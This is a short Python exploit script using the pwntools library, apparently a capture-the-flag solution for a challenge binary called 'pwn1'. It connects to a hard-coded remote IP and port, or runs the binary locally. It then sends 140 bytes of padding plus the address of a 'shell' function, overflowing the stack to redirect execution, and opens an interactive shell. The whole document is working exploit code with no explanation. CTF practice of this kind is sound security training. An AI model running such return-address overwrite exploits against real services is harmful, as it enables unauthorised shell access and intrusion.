from pwn import *
def connect(server=1):
	if server:
		try:
			return remote("104.154.106.182" ,"2345")
		except:
			print "[-] The server is down : (Try offline) `con = connect(0)` on line 12"
	else:
		return process("./pwn1")
file = ELF("./pwn1")
shell = file.symbols['shell']
con = connect()

padding = "A"*140
payload = padding + p32(shell)
con.sendline(payload)
con.interactive()